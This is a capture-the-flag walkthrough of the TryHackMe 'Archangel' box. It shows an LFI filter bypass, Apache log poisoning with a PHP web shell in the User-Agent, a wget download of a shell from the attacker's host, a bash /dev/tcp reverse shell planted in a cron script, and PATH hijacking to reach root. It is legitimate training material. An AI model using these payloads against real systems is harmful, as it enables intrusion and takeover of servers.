```bash
# PLATFORM          . THM
# CTF NAME          . Archangel
# DESCRIPTION       . Boot2root, Web exploitation, Privilege escalation, LFI
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/archangel
```

___

```bash
sudo nmap -sSVC -T5 -p- 10.10.134.131 -oN archangel
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)
|   256 637327c76104256a08707a36b2f2840d (ECDSA)
|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The website seems to be just an ordinary template. 
- `robots.txt` is not existing. 
- Fuzzing the website doesn't reveal anything interesting except the `/flags` directory which you better not look into :) 

- The only interesting thing we find here is the email on the webpage: `support@mafialive.thm`.

- Take note of the `mafialive.thm` domain.

- Let's add this to our `/etc/hosts` file so we can access it.

```
10.10.134.131	mafialive.thm
```

- If we go to `http://mafialive.thm`, we can find the first flag.

- `robots.txt` exists on this website and denies crawling for `/test.php`, so let's try it out.

- On `test.php`, we can find a simple button that is displaying `Control is an ilussion` when is pressed.

- However, take a look at the URL after you press the button: `?view=/var/www/html/development_testing/mrrobot.php`

- I wasted quite some time trying to bypass the filter with known payloads but I had no luck.

- However, I noticed that if we go to a known page `(eg: test.php)`, we're still not seeing anything. 

- This might be because the output is in base64 or not returned to the apache webserver at all

- To test it out, I used the `php://filter/convert.base64-encode/resource` filter as follows

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

- After saving the output to a file and decoding it, we find the following

```
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{redacted}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>

```

- Alright, what matters is in this piece of code

```
if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{
```

- The first condition limits the path traversal by `../..` and the second one restricts us to a single location.

- We can use `.././..` instead to traverse directories. The payload should look like this

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd
```

- Now, I know I must poison this in some way to be able to execute arbitrary commands or to point to a remote file and transform LFI to RFI, but I had no idea how.

- After some research, I found [this](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/) article that explained how this vulnerability is working.

- So I fired up burp suite and intercepted the first request

```
GET /test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log HTTP/1.1
Host: mafialive.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- I've replaced `(Windows NT 10.0; Win64; x64)` in `User-Agent` line with my payload, `<?php system($_GET['cmd']); ?>`

- After this, I made another request to `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd&cmd=echo "AOLEU"

- I wanted to see if that text will be shown in the output of the page, and it did. So our poisoning is working.

- The easiest thing now would be to get a reverse shell from our box, so let's do it.

- Make a request to ``http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd&cmd=wget http://ip:port/shell.php

```
GET /test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=wget http://IP:80/shell.php HTTP/1.1
Host: mafialive.thm
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

```

- Forward the request in burp suite.

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.134.131 - - [11/Dec/2023 00:24:52] "GET /shell.php HTTP/1.1" 200 -
10.10.134.131 - - [11/Dec/2023 00:24:52] "GET /shell.php HTTP/1.1" 200 -
10.10.134.131 - - [11/Dec/2023 00:24:52] "GET /shell.php HTTP/1.1" 200 -
10.10.134.131 - - [11/Dec/2023 00:24:52] "GET /shell.php HTTP/1.1" 200 -
```

- As we can see, our file has been downloaded. Start the listener and head up to `http://mafialive.thm/shell.php`

- Once we're inside, we can find the `user.txt` flag in `/home/archangel`.

- Also, we have access to read from `/home/archangel/myfiles/passwordbackup`

```
www-data@ubuntu:/home/archangel$ cat myfiles/passwordbackup 
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

- I'm not opening that :pain:

- However, I've used `find / -perm -222 -type d 2>/dev/null` as part of my usual routine to find privilege escalation vectors and I've noticed that I have write access to `/opt`

```
ls -la /opt/

drwxrwxrwx  3 root      root      4096 Dec 11 04:09 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxrwx---  2 archangel archangel 4096 Nov 20  2020 backupfiles
-rwxrwxrwx  1 archangel archangel   53 Dec 11 04:09 helloworld.sh
```

- We don't have access to `backupfiles` directory, but we can write to `helloworld.sh` script.

- This is getting executed as `archangel` under a cronjob.

```
# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
```

- So I've replaced the content to the reverse shell below and started a new listner. 

```
#!/bin/bash
sh -i >& /dev/tcp/10.11.53.46/3133 0>&1
```

- Shortly after, we got a shell as user `archangel.` 

- The second flag is in `/home/archangel/secret/user2.txt`

- Here is a script called `backup` that's owned by `root:root` but to which we have execute permissions.

- Using `strings` against it reveals some of its functionality

```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

- I was stuck here for a while, but the CTF hint is `certain paths are dangerous`. 

- Not much help I got from this initially, but after some time I was thinking that, since this runs as root, try to change the `cp` command to a malicious one.

- I created a file called `cp` in `/home/archangel/secret` that contained `/bin/bash`. 
- Then, I made it executable by using `chmod +x cp` 

- Now, we need to add the current path to the $PATH variable.

```
export PATH=/home/archangel/secret:$PATH
```

- And run the backup binary: `./backup`

- The final flag is in `/root/root.txt`

